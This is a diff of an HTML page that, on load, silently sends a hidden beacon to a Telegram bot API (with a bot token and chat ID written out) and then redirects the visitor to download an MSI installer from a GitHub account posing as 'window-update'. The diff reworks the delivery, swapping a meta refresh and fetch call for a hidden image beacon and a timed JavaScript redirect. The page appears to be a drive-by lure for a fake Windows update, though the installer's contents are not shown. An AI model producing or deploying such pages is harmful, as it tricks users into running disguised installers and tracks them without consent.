@@ -2,16 +2,22 @@
 <html>
 <head>
   <meta charset="utf-8">
-
-  <!-- Instant redirect -->
-  <meta http-equiv="refresh" content="0; url=https://github.com/window-update/update/releases/download/v1.0/em_jWQfm6UX_installer_beta.msi">
-
-  <!-- Telegram tracking (optional, keep for next step) -->
-  <script>
-    fetch("https://api.telegram.org/8280987765:AAHZMIq3foT6VbiAVe5r29iU-PA-TfRe8cQ/sendMessage?chat_id=6010462662&text=Download+clicked");
-  </script>
-
+  <title>Redirecting…</title>
 </head>
 <body>
+
+<!-- Telegram tracking beacon (fires before redirect) -->
+<img
+  src="https://api.telegram.org/bot8280987765:AAHZMIq3foT6VbiAVe5r29iU-PA-TfRe8cQ/sendMessage?chat_id=6010462662&text=Download+clicked"
+  style="display:none"
+/>
+
+<script>
+  // Redirect after tracking request is sent
+  setTimeout(function () {
+    window.location.href = "https://github.com/window-update/update/releases/download/v1.0/em_jWQfm6UX_installer_beta.msi";
+  }, 150);
+</script>
+
 </body>
 </html>
